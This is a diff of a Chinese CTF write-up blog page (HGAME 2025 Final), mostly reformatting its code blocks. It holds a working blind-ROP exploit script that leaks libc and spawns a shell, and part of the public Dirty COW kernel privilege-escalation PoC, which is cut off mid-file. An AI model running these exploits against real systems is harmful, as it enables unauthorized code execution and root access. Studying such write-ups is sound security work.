@@ -19,7 +19,7 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"summ2.link","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.23.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":"mac","style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeIn","post_block":"fadeIn","post_header":"fadeIn","post_body":"fadeIn"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"summ2.link","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.23.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"copycode":{"enable":"mac","style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeIn","post_block":"fadeIn","post_header":"fadeIn","post_body":"fadeIn"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
 
     <meta name="description" content="Backto2016  但你必须先向我们证明自己有回到 2016 的实力！ 祝你玩的开心 o (￣▽￣) ブ 没有附件是正常的喵 这个分数或许也考虑了买 hint 这件事，别害怕嘻嘻  这道题是没有给出附件的，我们需要根据输入和程序的输出获取一切信息。">
 <meta property="og:type" content="article">
@@ -329,24 +329,107 @@ gadget 能让程序保持正常运行，在寻找其他 gadget 时起到了区�
 <p>在 Ubuntu
 14.04 中，我们有一个很好的函数<code>__libc_csu_init()</code>，里面存在控制传参寄存器的 gadget，具体请参考<a target="_blank" rel="noopener" href="https://www.bookstack.cn/read/CTF-All-In-One/doc-4.7_common_gadget.md">通用
 gadget</a>。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040082a &lt;+90&gt;:    5b      pop    rbx</span><br><span class="line">0x000000000040082b &lt;+91&gt;:    5d      pop    rbp</span><br><span class="line">0x000000000040082c &lt;+92&gt;:    41 5c   pop    r12</span><br><span class="line">0x000000000040082e &lt;+94&gt;:    41 5d   pop    r13</span><br><span class="line">0x0000000000400830 &lt;+96&gt;:    41 5e   pop    r14</span><br><span class="line">0x0000000000400832 &lt;+98&gt;:    41 5f   pop    r15</span><br><span class="line">0x0000000000400834 &lt;+100&gt;:   c3      ret</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="highlight assembly">0x000000000040082a &lt;+90&gt;:    5b      pop    rbx
+0x000000000040082b &lt;+91&gt;:    5d      pop    rbp
+0x000000000040082c &lt;+92&gt;:    41 5c   pop    r12
+0x000000000040082e &lt;+94&gt;:    41 5d   pop    r13
+0x0000000000400830 &lt;+96&gt;:    41 5e   pop    r14
+0x0000000000400832 &lt;+98&gt;:    41 5f   pop    r15
+0x0000000000400834 &lt;+100&gt;:   c3      ret</code></pre>
 <p>所以，我们可以这样布置栈数据：</p>
-<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = flat({</span><br><span class="line">    offset: [</span><br><span class="line">        canary,</span><br><span class="line">        p64(<span class="number">1</span>),</span><br><span class="line">        p64(pop_gadget),</span><br><span class="line">        p64(<span class="number">0</span>)*<span class="number">6</span>,</span><br><span class="line">        p64(stop_gadget)</span><br><span class="line">        ]</span><br><span class="line">    })</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="highlight python">payload = flat({
+    offset: [
+        canary,
+        p64(<span class="number">1</span>),
+        p64(pop_gadget),
+        p64(<span class="number">0</span>)*<span class="number">6</span>,
+        p64(stop_gadget)
+        ]
+    })</code></pre>
 <p>但是还存在一个小问题，如果遍历时 <code>pop_gadget</code> 恰好是另一个 stop
 gadget，程序也不会发生段错误，和执行到真正的 gadget 处结果一样。</p>
 <p>因此，我们还需要进一步验证，它是否我们需要的。</p>
 <p>在这道题中，我找到的 stop gadget 会输出一些固定字符：</p>
-<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="string">b"killed by"</span> <span class="keyword">not</span> <span class="keyword">in</span> resp):</span><br><span class="line">    payload = flat({</span><br><span class="line">            offset: [</span><br><span class="line">                canary,</span><br><span class="line">                p64(<span class="number">1</span>),</span><br><span class="line">                p64(pop_gadget)</span><br><span class="line">                ]</span><br><span class="line">            })</span><br><span class="line">            p.sendafter(<span class="string">"password"</span>,payload)</span><br><span class="line">            resp = p.recv()</span><br><span class="line">            resp = p.recv()</span><br><span class="line">            log.success(<span class="string">f"stop_gadget[<span class="subst">{i}</span>] = <span class="subst">{<span class="built_in">hex</span>(stop_gadget)}</span>"</span>)</span><br><span class="line">            log.success(<span class="string">f"pop_gadget[<span class="subst">{i}</span>] = <span class="subst">{<span class="built_in">hex</span>(pop_gadget)}</span>"</span>)</span><br><span class="line">            choose = <span class="built_in">input</span>(<span class="string">"Continue?"</span>)</span><br><span class="line">            <span class="keyword">if</span>(choose==<span class="string">"y"</span> <span class="keyword">or</span> choose==<span class="string">"Y"</span>):<span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="highlight python"><span class="keyword">if</span> ( <span class="string">b"killed by"</span> <span class="keyword">not</span> <span class="keyword">in</span> resp):
+    payload = flat({
+            offset: [
+                canary,
+                p64(<span class="number">1</span>),
+                p64(pop_gadget)
+                ]
+            })
+            p.sendafter(<span class="string">"password"</span>,payload)
+            resp = p.recv()
+            resp = p.recv()
+            log.success(<span class="string">f"stop_gadget[<span class="subst">{i}</span>] = <span class="subst">{<span class="built_in">hex</span>(stop_gadget)}</span>"</span>)
+            log.success(<span class="string">f"pop_gadget[<span class="subst">{i}</span>] = <span class="subst">{<span class="built_in">hex</span>(pop_gadget)}</span>"</span>)
+            choose = <span class="built_in">input</span>(<span class="string">"Continue?"</span>)
+            <span class="keyword">if</span>(choose==<span class="string">"y"</span> <span class="keyword">or</span> choose==<span class="string">"Y"</span>):<span class="keyword">continue</span>
+            <span class="keyword">break</span></code></pre>
 <p>观察回显，如果没有输出，那么这大概率是正确的。当然在后续过程中我们可以更确定这个 gadget 是不是真的。</p>
 <h3 id="dump-memory">Dump memory</h3>
 <p>得到需要的 gadget，就可以开始 dump memory 了。</p>
 <p>为了找到 <code>write()</code> 的 plt 地址，可以将 <code>$rdi</code> 赋值 <code>0x400000</code>，即 <code>write(0x400000)</code>，如果地址正确，我们会得到 ELF 头几个固定字符：<code>\x7fELF</code></p>
-<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    put_addr += <span class="number">1</span></span><br><span class="line">    payload = flat({</span><br><span class="line">    offset: [</span><br><span class="line">        canary,</span><br><span class="line">        p64(<span class="number">1</span>),</span><br><span class="line">        p64(pop_gadget),</span><br><span class="line">        p64(<span class="number">0x400000</span>),<span class="comment">#pop rdi</span></span><br><span class="line">        p64(put_addr),</span><br><span class="line">        p64(stop_gadget)</span><br><span class="line">        ]</span><br><span class="line">    })</span><br><span class="line">    p.sendafter(<span class="string">"password"</span>,payload)</span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        resp = p.recv()</span><br><span class="line">        resp = p.recv()</span><br><span class="line">        <span class="keyword">if</span> ( <span class="string">b"\x7fELF"</span> <span class="keyword">in</span> resp):</span><br><span class="line">            log.success(<span class="string">f"put found[<span class="subst">{i}</span>] = <span class="subst">{<span class="built_in">hex</span>(put_addr)}</span>"</span>)</span><br><span class="line">            choose = <span class="built_in">input</span>(<span class="string">"Continue?"</span>)</span><br><span class="line">            <span class="keyword">if</span>(choose==<span class="string">"y"</span> <span class="keyword">or</span> choose==<span class="string">"Y"</span>):<span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="highlight python"><span class="keyword">while</span> <span class="literal">True</span>:
+    put_addr += <span class="number">1</span>
+    payload = flat({
+    offset: [
+        canary,
+        p64(<span class="number">1</span>),
+        p64(pop_gadget),
+        p64(<span class="number">0x400000</span>),<span class="comment">#pop rdi</span>
+        p64(put_addr),
+        p64(stop_gadget)
+        ]
+    })
+    p.sendafter(<span class="string">"password"</span>,payload)
+    <span class="keyword">try</span>: 
+        resp = p.recv()
+        resp = p.recv()
+        <span class="keyword">if</span> ( <span class="string">b"\x7fELF"</span> <span class="keyword">in</span> resp):
+            log.success(<span class="string">f"put found[<span class="subst">{i}</span>] = <span class="subst">{<span class="built_in">hex</span>(put_addr)}</span>"</span>)
+            choose = <span class="built_in">input</span>(<span class="string">"Continue?"</span>)
+            <span class="keyword">if</span>(choose==<span class="string">"y"</span> <span class="keyword">or</span> choose==<span class="string">"Y"</span>):<span class="keyword">continue</span>
+            <span class="keyword">break</span>
+    <span class="keyword">except</span>:
+        <span class="keyword">pass</span></code></pre>
 <p><img src="\2025320-HGAME-2025-Final-复现/image-20250401111921507.png"></p>
 <p>回顾 <code>plt</code> 表的知识，我们知道，已经调用过的函数地址会被保存在<code>.got</code> 段中。</p>
 <h2 id="get-shell">Get shell</h2>
 <p>后续过程就比较简单了，写 ROP 链即可。</p>
-<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">stop_gadget=<span class="number">0x400700</span></span><br><span class="line">pop_gadget=<span class="number">0x400b2a</span>+<span class="number">0x9</span></span><br><span class="line">put_addr = <span class="number">0x400715</span></span><br><span class="line">got_addr = <span class="number">0x602018</span></span><br><span class="line">payload = flat({</span><br><span class="line">      offset: [</span><br><span class="line">        canary,</span><br><span class="line">        p64(<span class="number">1</span>),</span><br><span class="line">        p64(pop_gadget),</span><br><span class="line">        p64(got_addr),<span class="comment">#pop rdi</span></span><br><span class="line">        p64(put_addr),</span><br><span class="line">    ]</span><br><span class="line">})</span><br><span class="line">p.sendafter(<span class="string">"password:\n"</span>,payload)</span><br><span class="line">put_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(put_addr))</span><br><span class="line">libc_base = put_addr - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">binsh_addr = libc_base +<span class="built_in">next</span>(libc.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload = flat({</span><br><span class="line">      offset: [</span><br><span class="line">        canary,</span><br><span class="line">        p64(<span class="number">1</span>),</span><br><span class="line">        p64(pop_gadget),</span><br><span class="line">        p64(binsh_addr),<span class="comment">#pop rdi</span></span><br><span class="line">        p64(sys_addr),</span><br><span class="line">    ]</span><br><span class="line">})</span><br><span class="line">p.sendafter(<span class="string">"password:"</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="highlight python">stop_gadget=<span class="number">0x400700</span>
+pop_gadget=<span class="number">0x400b2a</span>+<span class="number">0x9</span>
+put_addr = <span class="number">0x400715</span>
+got_addr = <span class="number">0x602018</span>
+payload = flat({
+      offset: [
+        canary,
+        p64(<span class="number">1</span>),
+        p64(pop_gadget),
+        p64(got_addr),<span class="comment">#pop rdi</span>
+        p64(put_addr),
+    ]
+})
+p.sendafter(<span class="string">"password:\n"</span>,payload)
+put_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))
+log.success(<span class="built_in">hex</span>(put_addr))
+libc_base = put_addr - libc.sym[<span class="string">"puts"</span>]
+log.success(<span class="built_in">hex</span>(libc_base))
+sys_addr = libc_base + libc.sym[<span class="string">"system"</span>]
+binsh_addr = libc_base +<span class="built_in">next</span>(libc.search(<span class="string">b"/bin/sh"</span>))
+
+pause()
+payload = flat({
+      offset: [
+        canary,
+        p64(<span class="number">1</span>),
+        p64(pop_gadget),
+        p64(binsh_addr),<span class="comment">#pop rdi</span>
+        p64(sys_addr),
+    ]
+})
+p.sendafter(<span class="string">"password:"</span>,payload)
+p.interactive()</code></pre>
 <h1 id="backto20162">Backto2016(2)</h1>
 <p>这题赛时并没有做出来（而且靶机跑的很慢，爆破不动），后面看了 wp 了解到这是一个 kernel
 vulnerability。</p>
@@ -376,7 +459,120 @@ memory, files, and data structures.</p>
 <p>通过 <code>mmap()</code> 映射文件到内存，利用写时复制，
 <code>write</code> 和 <code>madvise()</code> 导致的条件竞争漏洞。</p>
 <p>下面是它的一个 POC，可参见：<a target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io">https://github.com/dirtycow/dirtycow.github.io</a></p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">####################### dirtyc0w.c #######################</span></span><br><span class="line"><span class="comment">$ sudo -s</span></span><br><span class="line"><span class="comment"># echo this is not a test &gt; foo</span></span><br><span class="line"><span class="comment"># chmod 0404 foo</span></span><br><span class="line"><span class="comment">$ ls -lah foo</span></span><br><span class="line"><span class="comment">-r-----r-- 1 root root 19 Oct 20 15:23 foo</span></span><br><span class="line"><span class="comment">$ cat foo</span></span><br><span class="line"><span class="comment">this is not a test</span></span><br><span class="line"><span class="comment">$ gcc -pthread dirtyc0w.c -o dirtyc0w</span></span><br><span class="line"><span class="comment">$ ./dirtyc0w foo m00000000000000000</span></span><br><span class="line"><span class="comment">mmap 56123000</span></span><br><span class="line"><span class="comment">madvise 0</span></span><br><span class="line"><span class="comment">procselfmem 1800000000</span></span><br><span class="line"><span class="comment">$ cat foo</span></span><br><span class="line"><span class="comment">m00000000000000000</span></span><br><span class="line"><span class="comment">####################### dirtyc0w.c #######################</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="type">int</span> f;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"><span class="type">char</span> *name;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> *str;</span><br><span class="line">  str=(<span class="type">char</span>*)arg;</span><br><span class="line">  <span class="type">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++)</span><br><span class="line">  {</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661</span></span><br><span class="line"><span class="comment">&gt; This is achieved by racing the madvise(MADV_DONTNEED) system call</span></span><br><span class="line"><span class="comment">&gt; while having the page of the executable mmapped in memory.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    c+=madvise(<span class="built_in">map</span>,<span class="number">100</span>,MADV_DONTNEED);</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"madvise %d\n\n"</span>,c);</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> *<span class="title function_">procselfmemThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> *str;</span><br><span class="line">  str=(<span class="type">char</span>*)arg;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16</span></span><br><span class="line"><span class="comment">&gt;  The in the wild exploit we are aware of doesn't work on Red Hat</span></span><br><span class="line"><span class="comment">&gt;  Enterprise Linux 5 and 6 out of the box because on one side of</span></span><br><span class="line"><span class="comment">&gt;  the race it writes to /proc/self/mem, but /proc/self/mem is not</span></span><br><span class="line"><span class="comment">&gt;  writable on Red Hat Enterprise Linux 5 and 6.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="type">int</span> f=open(<span class="string">"/proc/self/mem"</span>,O_RDWR);</span><br><span class="line">  <span class="type">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++) {</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to reset the file pointer to the memory position.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    lseek(f,(<span class="type">uintptr_t</span>) <span class="built_in">map</span>,SEEK_SET);</span><br><span class="line">    c+=write(f,str,<span class="built_in">strlen</span>(str));</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"procselfmem %d\n\n"</span>, c);</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[])</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to pass two arguments. File and Contents.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="keyword">if</span> (argc&lt;<span class="number">3</span>) {</span><br><span class="line">  (<span class="type">void</span>)<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>,</span><br><span class="line">      <span class="string">"usage: dirtyc0w target_file new_content"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>; }</span><br><span class="line">  <span class="type">pthread_t</span> pth1,pth2;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to open the file in read only mode.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  f=open(argv[<span class="number">1</span>],O_RDONLY);</span><br><span class="line">  fstat(f,&amp;st);</span><br><span class="line">  name=argv[<span class="number">1</span>];</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to use MAP_PRIVATE for copy-on-write mapping.</span></span><br><span class="line"><span class="comment">&gt; Create a private copy-on-write mapping.  Updates to the</span></span><br><span class="line"><span class="comment">&gt; mapping are not visible to other processes mapping the same</span></span><br><span class="line"><span class="comment">&gt; file, and are not carried through to the underlying file.  It</span></span><br><span class="line"><span class="comment">&gt; is unspecified whether changes made to the file after the</span></span><br><span class="line"><span class="comment">&gt; mmap() call are visible in the mapped region.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to open with PROT_READ.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"mmap %zx\n\n"</span>,(<span class="type">uintptr_t</span>) <span class="built_in">map</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to do it on two threads.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  pthread_create(&amp;pth1,<span class="literal">NULL</span>,madviseThread,argv[<span class="number">1</span>]);</span><br><span class="line">  pthread_create(&amp;pth2,<span class="literal">NULL</span>,procselfmemThread,argv[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to wait for the threads to finish.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  pthread_join(pth1,<span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(pth2,<span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="highlight c"><span class="comment">/*</span>
+<span class="comment">####################### dirtyc0w.c #######################</span>
+<span class="comment">$ sudo -s</span>
+<span class="comment"># echo this is not a test &gt; foo</span>
+<span class="comment"># chmod 0404 foo</span>
+<span class="comment">$ ls -lah foo</span>
+<span class="comment">-r-----r-- 1 root root 19 Oct 20 15:23 foo</span>
+<span class="comment">$ cat foo</span>
+<span class="comment">this is not a test</span>
+<span class="comment">$ gcc -pthread dirtyc0w.c -o dirtyc0w</span>
+<span class="comment">$ ./dirtyc0w foo m00000000000000000</span>
+<span class="comment">mmap 56123000</span>
+<span class="comment">madvise 0</span>
+<span class="comment">procselfmem 1800000000</span>
+<span class="comment">$ cat foo</span>
+<span class="comment">m00000000000000000</span>
+<span class="comment">####################### dirtyc0w.c #######################</span>
+<span class="comment">*/</span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span>
+
+<span class="type">void</span> *<span class="built_in">map</span>;
+<span class="type">int</span> f;
+<span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span>
+<span class="type">char</span> *name;
+ 
+<span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span>
+{
+  <span class="type">char</span> *str;
+  str=(<span class="type">char</span>*)arg;
+  <span class="type">int</span> i,c=<span class="number">0</span>;
+  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++)
+  {
+<span class="comment">/*</span>
+<span class="comment">You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661</span>
+<span class="comment">&gt; This is achieved by racing the madvise(MADV_DONTNEED) system call</span>
+<span class="comment">&gt; while having the page of the executable mmapped in memory.</span>
+<span class="comment">*/</span>
+    c+=madvise(<span class="built_in">map</span>,<span class="number">100</span>,MADV_DONTNEED);
+  }
+  <span class="built_in">printf</span>(<span class="string">"madvise %d\n\n"</span>,c);
+}
+ 
+<span class="type">void</span> *<span class="title function_">procselfmemThread</span><span class="params">(<span class="type">void</span> *arg)</span>
+{
+  <span class="type">char</span> *str;
+  str=(<span class="type">char</span>*)arg;
+<span class="comment">/*</span>
+<span class="comment">You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16</span>
+<span class="comment">&gt;  The in the wild exploit we are aware of doesn't work on Red Hat</span>
